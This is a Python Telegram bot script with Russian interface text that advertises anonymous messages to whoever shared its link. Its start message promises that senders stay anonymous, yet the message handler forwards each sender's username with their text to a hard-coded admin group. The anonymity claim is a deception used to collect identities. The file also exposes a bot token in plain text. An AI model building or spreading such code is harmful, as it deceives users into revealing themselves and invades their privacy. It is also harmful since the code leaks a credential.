import telebot
from telebot import types

token = '7318172593:AAGws5Y8E6tgUF95A1tLqrQQ9S3r52w_HJY'  # Замените на ваш токен
bot = telebot.TeleBot(token)

# Словарь для отслеживания состояния повторения для каждого пользователя
user_repeat_status = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_repeat_status[message.chat.id] = False  # Изначально режим повторения отключен

    # Создание кнопки "Отменить"
    button_cancel = types.InlineKeyboardButton('Отменить ✖️', callback_data='cancel')
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(button_cancel)

    text_1 = '🚀 Вы можете отправить анонимное сообщение человеку, который поделился этой ссылкой. \n 🖊 Напишите всё, что хотите ему сказать, и через несколько секунд он получит ваше сообщение, не зная, кто его отправил.'
    bot.reply_to(message, text_1, reply_markup=keyboard)

@bot.message_handler(content_types=['text'])
def message_input_step(message):


    keyboard = types.InlineKeyboardMarkup()
    button_repeat = types.InlineKeyboardButton('Написать еще раз 🔄', callback_data='repeat')
    button_cancel = types.InlineKeyboardButton('Отменить ✖️', callback_data='cancel')
    keyboard.add(button_repeat, button_cancel)


    if message.chat.id in user_repeat_status and not user_repeat_status[message.chat.id]:
        bot.reply_to(message, f'Текст успешно отправлен! Ожидайте ответа', reply_markup=keyboard)
        name_to_admin = message.from_user.username
        text_to_admin = message.text
        print(message.chat.id)
        user_repeat_status[message.chat.id] = True  # Устанавливаем статус повторения в True

        bot.send_message(chat_id=-1002223318923, text=f'{name_to_admin}: "{text_to_admin}" ')
        bot.send_message(chat_id=-1002223318923, text=f'🔔 У тебя новое сообщение! \n \n {text_to_admin} \n \n ↩️ Свайпни для ответа.')
    else:
        bot.reply_to(message, f'Неизвестная команда!')

fake_but_1 = types.InlineKeyboardButton('Поделиться ссылкой', url="https://t.me/share/url?url=%D0%92%D0%B0%D0%B4%D0%B0%D0%B9%20%D0%BC%D0%BD%D0%B5%20%D0%B0%D0%BD%D0%BE%D0%BD%D0%B8%D0%BC%D0%BD%D1%8B%D0%B9%20%D0%B2%D0%BE%D0%BF%D1%80%D0%BE%D1%81%0A%0A%F0%9F%91%89%20t.me/anonaskin_bot?start=chwak")
fake_but_2 = types.InlineKeyboardButton('Добавить в чат', url="https://t.me/anonaskin_bot?startgroup&admin=post_messages")
fake_keyboard = types.InlineKeyboardMarkup()
fake_keyboard.add(fake_but_1, fake_but_2)


@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    if call.data == "cancel":
        user_repeat_status[call.message.chat.id] = True  # Отключаем режим повторения
        bot.answer_callback_query(call.id, "Выполнено.")
        text_for_button = 'Начните получать анонимные вопросы уже сегодня! \n 👉 (t.me/anonaskin_bot?start=chak) \nДобавьте эту ссылку ☝️ в описание своего профиля в Telegram, TikTok или Instagram (stories), чтобы ваши подписчики могли задать вам вопросы 💬.'
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              text=text_for_button, reply_markup=fake_keyboard)
    elif call.data == "repeat":
            start(call.message)
# Запуск бота
bot.infinity_polling()